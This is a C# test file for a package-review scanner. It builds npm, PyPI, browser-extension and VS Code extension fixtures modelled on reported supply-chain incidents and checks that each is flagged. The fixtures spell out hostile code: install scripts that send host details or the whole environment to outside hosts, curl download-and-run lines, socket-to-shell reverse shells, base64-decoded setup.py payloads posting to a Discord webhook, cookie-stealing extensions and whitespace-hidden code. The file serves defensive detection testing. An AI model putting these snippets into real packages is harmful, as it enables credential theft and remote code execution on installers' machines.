using System.Formats.Tar;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Text;
using Corvus.Core;
using Corvus.Services.Analysis;
using Corvus.Services.Web.Packages;

namespace Corvus.Tests;

/// <summary>
/// Packages reviewed before installing. The noteworthy fixtures are inert models of publicly reported package incidents
/// (dependency-confusion recon, install-time downloaders, environment exfiltration, decoded setup.py payloads, .pth
/// start-up hooks, cookie-reading and remote-code extensions); the ordinary ones carry the same features used plainly.
/// </summary>
public sealed class PackageReviewTests : IDisposable
{
    private readonly TempDir _dir = new();

    public void Dispose() => _dir.Dispose();

    private static byte[] U(string s) => Encoding.UTF8.GetBytes(s);

    private string Tgz(string name, params (string Path, string Text)[] files)
    {
        var path = _dir.File(name);
        using (var fs = File.Create(path))
        using (var gz = new GZipStream(fs, CompressionLevel.Fastest))
        using (var tar = new TarWriter(gz, TarEntryFormat.Ustar))
            foreach (var (p, text) in files)
                tar.WriteEntry(new UstarTarEntry(TarEntryType.RegularFile, p) { DataStream = new MemoryStream(U(text)) });
        return path;
    }

    private string Zip(string name, params (string Path, byte[] Data)[] files)
    {
        var path = _dir.File(name);
        File.WriteAllBytes(path, ContainerFixtures.Zip(files));
        return path;
    }

    private static PackageReport Review(string path) => PackageReview.Review(path, default) ?? throw new InvalidOperationException("not a package");

    // --- npm ---

    [Fact]
    public void A_dependency_confusion_preinstall_that_sends_host_details_is_noteworthy()
    {
        var r = Review(Tgz("internal-auth-1.0.0.tgz",
            ("package/package.json", """{"name":"internal-auth-utils","version":"99.0.0","scripts":{"preinstall":"node index.js"}}"""),
            ("package/index.js", "const os=require('os'),https=require('https');\nhttps.get('https://x1.oastify.com/?h='+os.hostname()+'&u='+os.userInfo().username);")));
        Assert.Equal("noteworthy", r.Review);
        Assert.Equal(new PackageScript("preinstall", "node index.js", true), Assert.Single(r.Scripts));
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "exfiltration", Path: "package/index.js" });
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "install script" } && f.Detail.Contains("host details", StringComparison.Ordinal));
    }

    [Fact]
    public void An_install_script_that_downloads_and_runs_a_program_is_noteworthy()
    {
        var r = Review(Tgz("parser-0.7.29.tgz",
            ("package/package.json", """{"name":"ua-parser-jss","version":"0.7.29","scripts":{"preinstall":"node preinstall.js"},"main":"src/index.js"}"""),
            ("package/preinstall.js", "const { exec } = require('child_process');\nexec('curl http://159.148.186.228/download/jsextension.exe -o jsextension.exe && jsextension.exe');"),
            ("package/src/index.js", "module.exports = {};")));
        Assert.Equal("noteworthy", r.Review);
        Assert.Contains(r.Findings, f => f is { Category: "exfiltration" });
        Assert.Contains(r.Findings, f => f is { Category: "name" } && f.Detail.Contains("'ua-parser-js'", StringComparison.Ordinal));
    }

    [Fact]
    public void An_obfuscated_install_script_is_read_through_its_layers()
    {
        var payload = File.ReadAllText(ScriptReaderTests.Fixture("javascript", "obfuscator-strings-rc4.js"));
        var r = Review(Tgz("colors-x.tgz",
            ("package/package.json", """{"name":"colorz-helper","version":"1.0.0","scripts":{"postinstall":"node setup.js"}}"""),
            ("package/setup.js", payload)));
        Assert.Equal("noteworthy", r.Review);
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "transformed code", Path: "package/setup.js" });
    }

    [Fact]
    public void An_install_script_that_sends_the_environment_is_noteworthy()
    {
        var r = Review(Tgz("crossenv.tgz",
            ("package/package.json", """{"name":"crossenv","version":"6.1.1","scripts":{"postinstall":"node package-setup.js"}}"""),
            ("package/package-setup.js", "const http=require('http');\nconst data=JSON.stringify(process.env);\nconst req=http.request({host:'npm.hacktask.net',path:'/log/',method:'POST'});req.write(data);req.end();")));
        Assert.Equal("noteworthy", r.Review);
        Assert.Contains(r.Findings, f => f.Category == "name" && f.Detail.Contains("'cross-env'", StringComparison.Ordinal));
    }

    [Fact]
    public void An_ordinary_package_lists_its_entry_points_and_native_build()
    {
        var r = Review(Tgz("addon-1.0.0.tgz",
            ("package/package.json", """{"name":"fast-hash-addon","version":"1.0.0","main":"index.js","bin":{"fhash":"cli.js"},"exports":{".":"./index.js","./sync":"./sync.js"},"scripts":{"test":"node test.js","prepare":"npm run build"},"dependencies":{"node-addon-api":"^8"}}"""),
            ("package/binding.gyp", "{}"), ("package/index.js", "module.exports = require('./build/Release/hash.node');"), ("package/cli.js", "#!/usr/bin/env node")));
        Assert.Equal("worth reviewing", r.Review);
        Assert.Contains(r.Scripts, s => s is { Name: "install", AtInstall: true } && s.Command.Contains("binding.gyp", StringComparison.Ordinal));
        Assert.Contains(r.Scripts, s => s is { Name: "prepare", AtInstall: false });
        Assert.Contains(new PackageEntryPoint("bin", "fhash", "cli.js"), r.EntryPoints);
        Assert.Contains(new PackageEntryPoint("exports", "./sync", "./sync.js"), r.EntryPoints);
        Assert.Equal(1, r.Dependencies);
        Assert.DoesNotContain(r.Findings, f => f.Level == "noteworthy");
    }

    [Fact]
    public void A_default_main_that_pipes_a_socket_into_a_shell_is_noteworthy()
    {
        var r = Review(Tgz("runner-1.0.0.tgz",
            ("package/package.json", """{"name":"node_package_runner","version":"1.0.0"}"""),
            ("package/index.js", "const net=require('net'),{spawn}=require('child_process');\nconst c=new net.Socket();\nc.connect(4444,'example.invalid',()=>{const sh=spawn('/bin/sh',[]);c.pipe(sh.stdin);sh.stdout.pipe(c);});")));
        Assert.Equal("noteworthy", r.Review);
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "process", Path: "package/index.js" } && f.Detail.Contains("reverse shell", StringComparison.Ordinal));
    }

    [Fact]
    public void An_install_command_that_runs_curl_is_noteworthy()
    {
        var r = Review(Tgz("lang-2.0.9.tgz", ("package/package.json", """{"name":"actions-ls","version":"2.0.9","scripts":{"preinstall":"curl --data @/etc/hostname example.invalid"}}""")));
        Assert.Equal("noteworthy", r.Review);
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "install script" } && f.Detail.Contains("network tool", StringComparison.Ordinal));
    }

    [Fact]
    public void An_install_command_that_runs_curl_by_its_full_path_is_noteworthy()
    {
        var r = Review(Tgz("notify-1.0.0.tgz", ("package/package.json", """{"name":"notify","version":"1.0.0","scripts":{"preinstall":"/usr/bin/curl --data-urlencode \"info=$(hostname && whoami)\" example.invalid"}}""")));
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "install script" } && f.Detail.Contains("network tool", StringComparison.Ordinal));
    }

    [Fact]
    public void A_postinstall_that_starts_a_detached_script_is_read_with_that_script()
    {
        var r = Review(Tgz("iotdb-1.0.0.tgz",
            ("package/package.json", """{"name":"iotdb","version":"1.0.0","scripts":{"postinstall":"node src/postinstall.js"}}"""),
            ("package/src/postinstall.js", "const { spawn } = require('child_process');\nconst path = require('path');\nspawn('node', [path.join(__dirname, 'main.js')], { detached: true, stdio: 'ignore' }).unref();"),
            ("package/src/main.js", "const os = require('os'), net = require('net');\nconst s = new net.Socket();\ns.connect(443, 'collector.example.invalid', () => s.write(os.hostname()));")));
        Assert.Equal("noteworthy", r.Review);
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "install script", Path: "package/src/postinstall.js" } && f.Detail.Contains("host details", StringComparison.Ordinal));
    }

    [Fact]
    public void An_install_eval_that_requires_a_downloader_and_a_collector_host_are_noteworthy()
    {
        var r = Review(Tgz("dt-tools-99.0.0.tgz",
            ("package/package.json", """{"name":"dt-tools","version":"99.0.0","scripts":{"preinstall":"node -e \"try{require('./install.js')}catch(e){}\""}}"""),
            ("package/install.js", "const https = require('https'), dns = require('dns'), { exec } = require('child_process');\ndns.lookup('ran.abc.oast.fun', () => {});\nhttps.get('https://example.invalid/tool', r => r.on('end', () => exec('/tmp/tool', { detached: true }).unref()));")));
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "exfiltration", Path: "package/install.js" });
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "install script" } && f.Detail.Contains("background process", StringComparison.Ordinal));
    }

    [Fact]
    public void Code_after_hundreds_of_spaces_on_a_line_is_noteworthy()
    {
        var r = Review(Tgz("animate-4.0.2.tgz", ("package/package.json", """{"name":"animate","version":"4.0.2","main":"index.js"}"""),
            ("package/index.js", "module.exports = {};" + new string('\t', 400) + "global['_V']='A4';")));
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "transformed code" } && f.Detail.Contains("spaces", StringComparison.Ordinal));
    }

    [Fact]
    public void A_main_that_runs_code_from_a_response_is_noteworthy()
    {
        var r = Review(Tgz("string-utils-1.0.3.tgz", ("package/package.json", """{"name":"string-utils","version":"1.0.3","main":"index.js"}"""),
            ("package/index.js", "fetch('https://status.example.invalid/check').then(r => r.json()).then(j => new Function('require', j.code)(require));")));
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "dynamic code" } && f.Detail.Contains("response", StringComparison.Ordinal));
    }

    [Fact]
    public void An_install_script_that_decodes_with_xor_and_detaches_and_a_main_that_hides_a_url_or_feeds_fetched_text_to_node_are_noteworthy()
    {
        var r = Review(Tgz("dayjs-2.3.12.tgz",
            ("package/package.json", """{"name":"dayjs-ext","version":"2.3.12","scripts":{"postinstall":"node lib/compile.js"},"main":"index.js"}"""),
            ("package/lib/compile.js", "var spawn = require('child_process').spawn;\nfunction d(b, k) { var s = ''; for (var i = 0; i < b.length; i++) s += String.fromCharCode(b[i] ^ (i * 13 + k & 0xff)); return s; }\nspawn(process.execPath, [d([82, 167], 9)], { detached: true, stdio: 'ignore' }).unref();"),
            ("package/index.js", "const K = 'aHR0cHM6Ly9leGFtcGxlLmludmFsaWQvYg==';\nmodule.exports = {};")));
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "process", Path: "package/lib/compile.js" } && f.Detail.Contains("outlives", StringComparison.Ordinal));
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "transformed code", Path: "package/lib/compile.js" } && f.Detail.Contains("XOR", StringComparison.Ordinal));
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "transformed code", Path: "package/index.js" } && f.Detail.Contains("URL hidden", StringComparison.Ordinal));
        var fed = Review(Tgz("sdk-1.0.6.tgz", ("package/package.json", """{"name":"sdk","version":"1.0.6","main":"main.js"}"""),
            ("package/main.js", "const axios = require('axios'), { spawn } = require('child_process');\n(async () => { const s = (await axios.get(process.env.U)).data.content;\nconst c = spawn('node', [], { stdio: ['pipe', 'ignore', 'ignore'] }); c.stdin.write(s); c.stdin.end(); })();")));
        Assert.Contains(fed.Findings, f => f is { Level: "noteworthy", Category: "remote code", Path: "package/main.js" });
    }

    [Fact]
    public void A_plain_package_has_nothing_to_review() =>
        Assert.Equal("none", Review(Tgz("left-pad-1.3.0.tgz", ("package/package.json", """{"name":"left-pad","version":"1.3.0","main":"index.js"}"""),
            ("package/index.js", "module.exports = (s, n, c) => String(s).padStart(n, c);"))).Review);

    // --- PyPI ---

    [Fact]
    public void A_setup_py_that_replaces_install_and_runs_decoded_code_is_noteworthy()
    {
        var code = Convert.ToBase64String(U("import os, urllib.request\nurllib.request.urlopen('https://discord.com/api/webhooks/1/x', data=str(dict(os.environ)).encode())"));
        var r = Review(Tgz("reqeusts-2.28.1.tar.gz",
            ("reqeusts-2.28.1/PKG-INFO", "Metadata-Version: 2.1\nName: reqeusts\nVersion: 2.28.1\nSummary: HTTP\n"),
            ("reqeusts-2.28.1/setup.py", $"from setuptools import setup\nfrom setuptools.command.install import install\nimport base64\nclass PostInstall(install):\n    def run(self):\n        exec(base64.b64decode('{code}'))\n        install.run(self)\nsetup(name='reqeusts', version='2.28.1', cmdclass={{'install': PostInstall}})\n")));
        Assert.Equal("pypi sdist", r.Ecosystem);
        Assert.Equal("noteworthy", r.Review);
        Assert.Contains(r.Findings, f => f is { Category: "dynamic code", Level: "noteworthy" });
        Assert.Contains(r.Findings, f => f is { Category: "install script" } && f.Detail.Contains("cmdclass", StringComparison.Ordinal));
        Assert.Contains(r.Findings, f => f.Category == "name" && f.Detail.Contains("'requests'", StringComparison.Ordinal));
    }

    [Fact]
    public void A_root_level_setup_py_that_runs_downloaded_code_and_a_bundled_program_is_noteworthy()
    {
        var r = Review(Zip("syntax-init-1.0.zip",
            ("setup.py", U("from setuptools import setup\nimport subprocess\nfrom urllib.request import urlopen\nexec(urlopen('https://paste.example.invalid/raw').read())\nsubprocess.run(['tool.exe'], check=True)\nsetup(name='syntax-init', version='1.0')\n"))));
        Assert.Equal("pypi sdist", r.Ecosystem);
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "dynamic code" } && f.Detail.Contains("downloads", StringComparison.Ordinal));
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "process" } && f.Detail.Contains("carries", StringComparison.Ordinal));
    }

    [Fact]
    public void A_setup_py_install_command_is_read_with_the_local_module_it_imports_and_a_decoded_command_is_noteworthy()
    {
        var r = Review(Tgz("netobs-99.6.tar.gz",
            ("netobs-99.6/PKG-INFO", "Metadata-Version: 2.1\nName: netobs\nVersion: 99.6\n"),
            ("netobs-99.6/setup.py", "from setuptools import setup\nfrom setuptools.command.install import install\nclass Post(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\nsetup(name='netobs', version='99.6', cmdclass={'install': Post})\n"),
            ("netobs-99.6/main.py", "import requests, subprocess\ndef m():\n    requests.get('https://example.invalid/t')\n    subprocess.Popen(['tool'], shell=True)\n")));
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "install script", Path: "netobs-99.6/setup.py" } && f.Detail.Contains("launches", StringComparison.Ordinal));
        var decoded = Review(Tgz("tiny-1.0.0.tar.gz",
            ("tiny-1.0.0/PKG-INFO", "Metadata-Version: 2.1\nName: tiny\nVersion: 1.0.0\n"),
            ("tiny-1.0.0/setup.py", "import os, base64, setuptools\ndef b64d(s): return base64.b64decode(s).decode()\nos.system(b64d('ZWNobyBoaQo='))\nsetuptools.setup(name='tiny', version='1.0.0')\n")));
        Assert.Contains(decoded.Findings, f => f is { Level: "noteworthy", Category: "process" } && f.Detail.Contains("decoded command", StringComparison.Ordinal));
    }

    [Fact]
    public void A_setup_py_that_puts_the_host_name_in_a_url_and_a_module_that_downloads_and_runs_a_program_are_noteworthy()
    {
        var r = Review(Tgz("keystack-99.0.tar.gz",
            ("keystack-99.0/PKG-INFO", "Metadata-Version: 2.1\nName: keystack\nVersion: 99.0\n"),
            ("keystack-99.0/setup.py", "import socket, subprocess\nfrom setuptools import setup\nh = socket.gethostname()\nurl = 'http://example.invalid/c/{h}'.format(h=h)\nsubprocess.run(['curl', '-s', url])\nsetup(name='keystack', version='99.0')\n"),
            ("keystack-99.0/keystack/__init__.py", "import subprocess, urllib.request\nurllib.request.urlretrieve(_URL, _BIN)\nsubprocess.Popen([_BIN])\n")));
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "install script" } && f.Detail.Contains("host details", StringComparison.Ordinal));
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "process", Path: "keystack-99.0/keystack/__init__.py" });
    }

    [Fact]
    public void Import_time_code_with_a_webhook_escaped_eval_and_stealer_dependencies_is_noteworthy()
    {
        var r = Review(Tgz("hugebbc-0.0.0.tar.gz",
            ("hugebbc-0.0.0/PKG-INFO", "Metadata-Version: 2.1\nName: hugebbc\nVersion: 0.0.0\n"),
            ("hugebbc-0.0.0/setup.py", "from setuptools import setup\nsetup(name='hugebbc', install_requires=['browser_cookie3', 'discordwebhook', 'requests'])\n"),
            ("hugebbc-0.0.0/hugebbc/__init__.py", "_e=eval(\"\\145\\x76\\x61\\x6c\")\nH='https://discord.com/api/webhooks/1/x'\n")));
        Assert.Equal("noteworthy", r.Review);
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "exfiltration", Path: "hugebbc-0.0.0/hugebbc/__init__.py" });
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "transformed code" } && f.Detail.Contains("escaped", StringComparison.Ordinal));
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "credentials" } && f.Detail.Contains("browser_cookie3", StringComparison.Ordinal));
    }

    [Fact]
    public void A_wheel_lists_entry_points_checks_its_record_and_names_start_up_hooks()
    {
        byte[] init = U("def main():\n    print('hi')\n"), pth = U("import tool_hook\n");
        string Hash(byte[] b) => "sha256=" + Convert.ToBase64String(SHA256.HashData(b)).TrimEnd('=').Replace('+', '-').Replace('/', '_');
        var record = $"tool/__init__.py,{Hash(init)},{init.Length}\ntool_hook.pth,{Hash(U("changed"))},7\ntool-1.0.dist-info/METADATA,,\ntool-1.0.dist-info/RECORD,,\n";
        var r = Review(Zip("tool-1.0-py3-none-any.whl",
            ("tool/__init__.py", init), ("tool_hook.pth", pth),
            ("tool-1.0.dist-info/METADATA", U("Metadata-Version: 2.1\nName: tool\nVersion: 1.0\nRequires-Dist: click\n")),
            ("tool-1.0.dist-info/entry_points.txt", U("[console_scripts]\ntool = tool:main\n")),
            ("tool-1.0.dist-info/RECORD", U(record))));
        Assert.Equal("pypi wheel", r.Ecosystem);
        Assert.Contains(new PackageEntryPoint("console_scripts", "tool", "tool:main"), r.EntryPoints);
        Assert.Equal("1 match, 1 differ, 1 not listed", r.Record);
        Assert.Contains(r.Findings, f => f is { Category: "record", Level: "noteworthy", Path: "tool_hook.pth" });
        Assert.Contains(r.Scripts, s => s is { Name: "tool_hook.pth", AtInstall: true });
    }

    // --- extensions ---

    [Fact]
    public void A_browser_extension_that_sends_cookies_and_runs_fetched_code_is_noteworthy()
    {
        var manifest = """{"manifest_version":3,"name":"Tab Saver","version":"1.0","permissions":["cookies","tabs","storage"],"host_permissions":["<all_urls>"],"background":{"service_worker":"bg.js"},"content_scripts":[{"matches":["<all_urls>"],"js":["cs.js"],"run_at":"document_start"}]}""";
        var r = Review(Zip("tab-saver.zip", ("manifest.json", U(manifest)),
            ("bg.js", U("chrome.cookies.getAll({}, c => fetch('https://collector.example.net/c', {method:'POST', body: JSON.stringify(c)}));")),
            ("cs.js", U("fetch('https://cdn.example.net/x.js').then(r => r.text()).then(t => eval(t));"))));
        Assert.Equal("browser extension (manifest v3)", r.Ecosystem);
        Assert.Equal("noteworthy", r.Review);
        Assert.Contains(r.Findings, f => f is { Category: "credentials", Level: "noteworthy", Path: "bg.js" });
        Assert.Contains(r.Findings, f => f is { Category: "remote code", Path: "cs.js" });
        Assert.Contains(r.Findings, f => f is { Category: "permission" } && f.Detail.StartsWith("every site, with cookies, tabs", StringComparison.Ordinal));
        var content = Assert.Single(r.ContentScripts!);
        Assert.Equal(["<all_urls>"], content.Matches);
        Assert.Equal(["cs.js"], content.Files);
        Assert.Equal(("document_start", false), (content.RunAt, content.AllFrames));
        Assert.Equal(["<all_urls>"], r.HostPermissions);
    }

    [Fact]
    public void A_crx3_header_gives_the_extension_id_and_verifies_its_key_proof()
    {
        var zip = ContainerFixtures.Zip(("manifest.json", U("""{"manifest_version":3,"name":"Clock","version":"2.0","permissions":["storage"]}""")));
        var path = _dir.File("clock.crx");
        File.WriteAllBytes(path, Crx3(zip, out var id));
        var r = Review(path);
        Assert.Equal("none", r.Review);
        Assert.Equal((3, id, 1, 1), (r.Signature!.Version, r.Signature.ExtensionId!, r.Signature.Proofs, r.Signature.Verified));
    }

    /// <summary>A CRX3 file signed with a fresh RSA key: header protobuf, signed data with the crx_id, the zip.</summary>
    internal static byte[] Crx3(byte[] zip, out string id)
    {
        using var rsa = RSA.Create(2048);
        var spki = rsa.ExportSubjectPublicKeyInfo();
        var crxId = SHA256.HashData(spki)[..16];
        id = string.Concat(crxId.Select(b => $"{(char)('a' + (b >> 4))}{(char)('a' + (b & 15))}"));
        byte[] Field(int field, byte[] value)
        {
            var ms = new MemoryStream();
            void Varint(ulong v) { while (v >= 0x80) { ms.WriteByte((byte)(v | 0x80)); v >>= 7; } ms.WriteByte((byte)v); }
            Varint((ulong)field << 3 | 2);
            Varint((ulong)value.Length);
            ms.Write(value);
            return ms.ToArray();
        }
        var signedData = Field(1, crxId);
        var message = new MemoryStream();
        message.Write("CRX3 SignedData\0"u8);
        message.Write(BitConverter.GetBytes(signedData.Length));
        message.Write(signedData);
        message.Write(zip);
        var sig = rsa.SignData(message.ToArray(), HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
        byte[] header = [.. Field(2, [.. Field(1, spki), .. Field(2, sig)]), .. Field(10000, signedData)];
        return [.. "Cr24"u8, .. BitConverter.GetBytes(3), .. BitConverter.GetBytes(header.Length), .. header, .. zip];
    }

    [Fact]
    public void A_vscode_extension_lists_activation_commands_and_startup()
    {
        var pkg = """{"name":"todo-lens","publisher":"acme","version":"0.3.0","main":"./out/extension.js","activationEvents":["onStartupFinished"],"contributes":{"commands":[{"command":"todo.scan","title":"Scan TODOs"}]},"scripts":{"vscode:prepublish":"tsc"}}""";
        var r = Review(Zip("acme.todo-lens-0.3.0.vsix",
            ("extension.vsixmanifest", U("""<PackageManifest xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011"><Metadata><Identity Id="todo-lens" Version="0.3.0" Publisher="acme" /><DisplayName>TODO Lens</DisplayName></Metadata></PackageManifest>""")),
            ("extension/package.json", U(pkg)), ("extension/out/extension.js", U("exports.activate = () => {};"))));
        Assert.Equal("vscode extension", r.Ecosystem);
        Assert.Equal("acme.todo-lens", r.Name);
        Assert.Equal("worth reviewing", r.Review);
        Assert.Contains(new PackageEntryPoint("command", "todo.scan", "Scan TODOs"), r.EntryPoints);
        Assert.Contains(r.Findings, f => f.Category == "activation");
        Assert.Contains(r.Scripts, s => s is { Name: "vscode:prepublish", AtInstall: false });
    }

    [Fact]
    public void A_vscode_extension_that_downloads_from_a_raw_address_into_the_startup_folder_is_noteworthy()
    {
        var pkg = """{"name":"companion","publisher":"acme","version":"2.0.0","main":"./extension.js","activationEvents":["*"]}""";
        var r = Review(Zip("acme.companion-2.0.0.vsix",
            ("extension/package.json", U(pkg)),
            ("extension/extension.js", U("const http=require('http'),os=require('os'),path=require('path');\nconst dir=path.join(os.homedir(),'AppData','Roaming','Microsoft','Windows','Start Menu','Programs','Startup');\nhttp.get('http://203.0.113.7/dl/tool.exe');"))));
        Assert.Equal("noteworthy", r.Review);
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "exfiltration", Path: "extension/extension.js" });
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "persistence" });
    }

    [Fact]
    public void A_vscode_extension_batch_file_that_downloads_a_program_and_starts_it_is_noteworthy()
    {
        var pkg = """{"name":"theme","publisher":"acme","version":"1.0.0","main":"./extension.js","activationEvents":["onStartupFinished"]}""";
        var r = Review(Zip("acme.theme-1.0.0.vsix", ("extension/package.json", U(pkg)),
            ("extension/extension.js", U("const { exec } = require('child_process');\nexports.activate = c => exec(`\"${c.asAbsolutePath('scripts/run.bat')}\"`);")),
            ("extension/scripts/run.bat", U("@echo off\r\nset \"EXE=%TEMP%\\tool.exe\"\r\ncurl -s -L -o \"%EXE%\" \"http://example.invalid/tool.exe\"\r\nif exist \"%EXE%\" start \"\" /B \"%EXE%\"\r\n"))));
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "process", Path: "extension/scripts/run.bat" } && f.Detail.Contains("starts it", StringComparison.Ordinal));
    }

    [Fact]
    public void A_vscode_extension_that_pipes_a_socket_into_a_shell_named_by_a_variable_or_sends_a_key_to_a_webhook_is_noteworthy()
    {
        var pkg = """{"name":"helper","publisher":"acme","version":"0.0.1","main":"./extension.js"}""";
        var shell = Review(Zip("acme.helper-0.0.1.vsix", ("extension/package.json", U(pkg)),
            ("extension/extension.js", U("const { exec } = require('child_process'), net = require('net');\nlet cmd = process.platform === 'win32' ? 'cmd.exe' : 'sh';\nconst sh = exec(cmd), s = new net.Socket();\ns.connect(9098, 'example.invalid', () => { s.pipe(sh.stdin); sh.stdout.pipe(s); });"))));
        Assert.Contains(shell.Findings, f => f is { Level: "noteworthy", Category: "process" } && f.Detail.Contains("reverse shell", StringComparison.Ordinal));
        var hook = Review(Zip("acme.helper-0.0.2.vsix", ("extension/package.json", U(pkg)),
            ("extension/extension.js", U("const url = 'https://discord.com/api/webhooks/1/x';\nexports.activate = async c => { const apiKey = await c.secrets.get('k'); await sendToWebhook(url, `key: ${apiKey}`); };"))));
        Assert.Contains(hook.Findings, f => f is { Level: "noteworthy", Category: "exfiltration" } && f.Detail.Contains("chat webhook", StringComparison.Ordinal));
    }

    [Fact]
    public void A_vscode_extension_that_lists_accounts_and_privileges_is_noteworthy()
    {
        var pkg = """{"name":"discover","publisher":"acme","version":"0.0.1","main":"./extension.js"}""";
        var r = Review(Zip("acme.discover-0.0.1.vsix", ("extension/package.json", U(pkg)),
            ("extension/extension.js", U("const { execSync } = require('child_process');\nexports.activate = () => execSync('whoami /priv', { encoding: 'utf8' }) + execSync('net user');"))));
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "host details" } && f.Detail.Contains("privilege", StringComparison.Ordinal));
    }

    [Fact]
    public void A_vscode_extension_whose_display_name_carries_zero_width_characters_is_noteworthy()
    {
        var pkg = """{"name":"sol","publisher":"acme","version":"1.0.0","displayName":"so​lid​ity","main":"./extension.js"}""";
        var r = Review(Zip("acme.sol-1.0.0.vsix", ("extension/package.json", U(pkg)), ("extension/extension.js", U("exports.activate = () => {};"))));
        Assert.Equal("noteworthy", r.Review);
        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "name" } && f.Detail.Contains("so\\u200blid", StringComparison.Ordinal));
    }

    [Fact]
    public void The_package_view_names_the_review_in_the_overview()
    {
        var path = Tgz("internal-auth-1.0.0.tgz",
            ("package/package.json", """{"name":"internal-auth-utils","version":"99.0.0","scripts":{"preinstall":"node index.js"}}"""),
            ("package/index.js", "require('https').get('https://x1.oastify.com/?h='+require('os').hostname());"));
        var bytes = File.ReadAllBytes(path);
        var view = new PackageFileView().Inspect(new FileInput(path, bytes, Blob.Identify(bytes)), default)!;
        Assert.StartsWith("npm package internal-auth-utils 99.0.0: noteworthy", view.Highlights[0]);
        Assert.Contains("runs at install: preinstall", view.Highlights[0]);
        Assert.Contains(view.Highlights, h => h.StartsWith("Noteworthy exfiltration:", StringComparison.Ordinal));
    }
}
